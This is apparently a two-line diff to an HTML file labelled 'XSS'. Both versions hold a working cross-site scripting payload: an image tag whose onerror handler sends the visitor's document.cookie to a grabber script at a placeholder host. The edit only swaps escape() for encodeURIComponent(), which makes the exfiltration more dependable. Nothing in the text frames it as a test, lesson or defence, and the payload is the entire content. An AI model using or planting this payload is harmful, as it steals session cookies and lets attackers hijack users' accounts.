@@ -1,2 +1,2 @@
 <!-- XSS -->
-<img src = 1 onerror = "new Image().src = 'http://yoursite.com/grabber.php?q=' + escape(document.cookie); src = 'what.jpg';"/>
+<img src = 1 onerror = "new Image().src = 'http://yoursite.com/grabber.php?q=' + encodeURIComponent(document.cookie); src = 'what.jpg';"/>
